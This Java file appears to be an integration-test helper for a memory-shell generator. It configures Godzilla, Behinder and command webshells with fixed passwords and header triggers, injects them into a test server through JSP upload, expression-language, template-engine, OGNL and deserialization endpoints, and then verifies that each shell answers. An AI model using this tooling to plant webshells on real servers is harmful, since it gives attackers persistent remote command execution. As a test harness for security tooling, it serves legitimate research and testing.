package com.reajason.javaweb.integration;

import com.reajason.javaweb.GeneratorMain;
import com.reajason.javaweb.memshell.SpringMVCShell;
import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.memshell.packer.Packer;
import lombok.extern.slf4j.Slf4j;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertionTool {
    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packer.INSTANCE packer) {
        String shellUrl = url + "/test";

        InjectorConfig injectorConfig = new InjectorConfig();
        if (shellType.endsWith(Constants.SERVLET) || shellType.endsWith(SpringMVCShell.CONTROLLER_HANDLER)) {
            String urlPattern = "/" + shellTool + shellType + packer.name();
            shellUrl = url + urlPattern;
            injectorConfig.setUrlPattern(urlPattern);
        }

        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .shellTool(shellTool)
                .shellType(shellType)
                .targetJreVersion(targetJdkVersion)
                .debug(true)
                .build();


        switch (shellTool) {
            case Godzilla:
                String godzillaPass = "pass";
                String godzillaKey = "key";
                String godzillaHeaderValue = "Godzilla" + shellType + packer.name();
                GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                        .pass(godzillaPass).key(godzillaKey)
                        .headerName("User-Agent").headerValue(godzillaHeaderValue)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, godzillaPass, godzillaKey, godzillaHeaderValue);
                String content = GeneratorMain.generate(shellConfig, injectorConfig, godzillaConfig, packer);
                assertInjectIsOk(url, shellType, shellTool, content, packer);
                GodzillaShellTool.testIsOk(shellUrl, godzillaConfig);
                break;
            case Command:
                String paramName = "Command" + shellType + packer.name();
                CommandConfig commandConfig = CommandConfig.builder().paramName(paramName).build();
                String commandContent = GeneratorMain.generate(shellConfig, injectorConfig, commandConfig, packer);
                log.info("generated {} command shell with paramName: {}", shellType, commandConfig.getParamName());
                assertInjectIsOk(url, shellType, shellTool, commandContent, packer);
                CommandShellTool.testIsOk(shellUrl, commandConfig);
                break;
            case Behinder:
                String behinderPass = "pass";
                String behinderHeaderValue = "Behinder" + shellType + packer.name();
                BehinderConfig behinderConfig = BehinderConfig.builder().pass(behinderPass).headerName("User-Agent").headerValue(behinderHeaderValue).build();
                log.info("generated {} behinder with pass: {}, headerValue: {}", shellType, behinderPass, behinderHeaderValue);
                String behinderContent = GeneratorMain.generate(shellConfig, injectorConfig, behinderConfig, packer);
                assertInjectIsOk(url, shellType, shellTool, behinderContent, packer);
                BehinderShellTool.testIsOk(shellUrl, behinderConfig);
        }
    }

    public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packer.INSTANCE packer) {
        switch (packer) {
            case JSP -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + ".jsp";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case ScriptEngine -> VulTool.postData(url + "/js", content);
            case EL -> VulTool.postData(url + "/el", content);
            case SpEL -> VulTool.postData(url + "/spel", content);
            case OGNL -> VulTool.postData(url + "/ognl", content);
            case Freemarker -> VulTool.postData(url + "/freemarker", content);
            case Velocity -> VulTool.postData(url + "/velocity", content);
            case Deserialize -> VulTool.postData(url + "/java_deserialize", content);
            case Base64 -> VulTool.postData(url + "/b64", content);
        }
    }
}
